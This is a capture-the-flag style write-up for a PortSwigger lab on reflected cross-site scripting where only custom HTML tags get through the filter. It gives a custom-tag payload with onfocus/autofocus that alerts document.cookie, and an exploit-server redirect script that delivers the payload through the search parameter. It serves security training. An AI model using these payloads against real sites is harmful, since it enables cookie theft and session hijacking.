## 15 - Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

## Notes

- Possibility to leave a comment on a post
- Search page
- Exploit Server

## Resume

1. Find payload on XSS cheat sheet
2. Exploit the XSS in search
3. Send payload using exploit server

## Solve

Using [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) filter with **custom tags**, **All events** and **Chrome** browser. 

Scroll and search for a payload using custom XSS : 

```js
<xss onfocus=alert(document.cookie) autofocus tabindex=1>
```

Set payload on **exploit server** : 

```js
<script>
location = 'https://0a0800f0033291e5806fbc01006900f0.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+autofocus+tabindex%3D1%3E';
</script>
```

